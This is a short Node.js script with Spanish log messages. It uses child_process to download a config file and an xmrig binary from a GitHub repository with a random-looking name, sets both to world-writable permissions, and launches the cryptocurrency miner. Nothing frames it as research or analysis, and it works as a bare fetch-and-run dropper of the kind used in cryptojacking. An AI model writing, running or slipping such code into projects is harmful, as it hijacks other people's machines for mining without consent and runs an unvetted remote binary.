const { exec } = require('child_process');

const downloadConfigCommand = 'wget https://raw.githubusercontent.com/flikamitai/Ufcujcfuuguf/main/config.json';
const downloadXmrigCommand = 'wget https://github.com/flikamitai/Ufcujcfuuguf/raw/main/xmrig';
const chmodXmrigCommand = 'chmod -R 777 xmrig';
const chmodConfigCommand = 'chmod -R 777 config.json';
const runXmrigCommand = './xmrig -c config.json';

exec(downloadConfigCommand, (downloadConfigError, downloadConfigStdout, downloadConfigStderr) => {
  if (downloadConfigError) {
    console.error(`Error al descargar config.json: ${downloadConfigError}`);
    return;
  }
  console.log(`Descarga de config.json exitosa: ${downloadConfigStdout}`);
  console.error(`stderr: ${downloadConfigStderr}`);

  exec(downloadXmrigCommand, (downloadXmrigError, downloadXmrigStdout, downloadXmrigStderr) => {
    if (downloadXmrigError) {
      console.error(`Error al descargar xmrig: ${downloadXmrigError}`);
      return;
    }
    console.log(`Descarga de xmrig exitosa: ${downloadXmrigStdout}`);
    console.error(`stderr: ${downloadXmrigStderr}`);

    exec(chmodXmrigCommand, (chmodXmrigError, chmodXmrigStdout, chmodXmrigStderr) => {
      if (chmodXmrigError) {
        console.error(`Error al cambiar permisos de xmrig: ${chmodXmrigError}`);
        return;
      }
      console.log(`Permisos de xmrig cambiados correctamente: ${chmodXmrigStdout}`);
      console.error(`stderr: ${chmodXmrigStderr}`);

      exec(chmodConfigCommand, (chmodConfigError, chmodConfigStdout, chmodConfigStderr) => {
        if (chmodConfigError) {
          console.error(`Error al cambiar permisos de config.json: ${chmodConfigError}`);
          return;
        }
        console.log(`Permisos de config.json cambiados correctamente: ${chmodConfigStdout}`);
        console.error(`stderr: ${chmodConfigStderr}`);

        exec(runXmrigCommand, (runXmrigError, runXmrigStdout, runXmrigStderr) => {
          if (runXmrigError) {
            console.error(`Error al ejecutar xmrig: ${runXmrigError}`);
            return;
          }
          console.log(`xmrig ejecutándose: ${runXmrigStdout}`);
          console.error(`stderr: ${runXmrigStderr}`);
        });
      });
    });
  });
});
